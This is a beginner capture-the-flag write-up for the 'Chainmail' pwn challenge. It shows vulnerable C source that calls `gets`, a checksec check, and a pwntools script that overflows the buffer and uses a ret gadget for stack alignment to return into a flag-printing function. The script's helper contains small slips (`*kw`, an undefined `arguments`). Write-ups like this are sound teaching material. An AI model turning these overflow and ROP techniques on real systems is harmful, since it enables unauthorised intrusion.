# Chainmail

Categories: pwn, beginner

Description:
> I've come up with a winning idea to make it big in the Prodigy and Hotmail scenes (or at least make your email widespread)!
>
>`$ nc chainmail.chal.uiuc.tf 1337`
>
>author: Emma
>
>[chal](resources/chal) [chal.c](resources/chal.c) [Dockerfile](resources/Dockerfile)

**Tags:** pwn, stack alignment, trivial

## Takeaways

* When you get a SIGSEGV in a `movaps XMMWORD PTR [rsp+0x10], xmm1` instruction, add a NOP gadget to your ROP chain. Your stack is not 16-byte aligned when `movaps` is executed and that's why you get a SIGSEGV.

## Solution

This is a classic ROP to win challenge. Here is the source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void give_flag() {
    FILE *f = fopen("/flag.txt", "r");
    if (f != NULL) {
        char c;
        while ((c = fgetc(f)) != EOF) {
            putchar(c);
        }
    }
    else {
        printf("Flag not found!\n");
    }
    fclose(f);
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    char name[64];
    printf("Hello, welcome to the chain email generator! Please give the name of a recipient: ");
    gets(name);
    printf("Okay, here's your newly generated chainmail message!\n\nHello %s,\nHave you heard the news??? Send this email to 10 friends or else you'll have bad luck!\n\nYour friend,\nJim\n", name);
    return 0;
}
```

Let's identify the binary:

```bash
nikos@ctf-box:~$ checksec --file ./chal
[*] '~/chal'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

This is a non-pie binary, we have a win function `give_flag`, a stack buffer overflow since the unsafe function `gets` is used, and no stack canary. We simply find the address of `give_flag` in the binary, and ROP there:

```python
from pwn import *
context.binary = elfexe = ELF('./chal')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

if args['REMOTE']:
    io = remote('chainmail.chal.uiuc.tf', 1337)
else:
    io = start(arguments)

give_flag__addr = 0x401216   # give_flag
nop_gadget__addr  = 0x401287 # ret - stack alignment
io.send(b'A'*64)
io.send(b'B'*8)
io.send(p64(nop_gadget__addr))
io.send(p64(give_flag__addr))
io.send(b'\n')

io.interactive()
io.close()
```

And we get the flag!

`uiuctf{y0ur3_4_B1g_5h0t_n0w!11!!1!!!11!!!!1}`
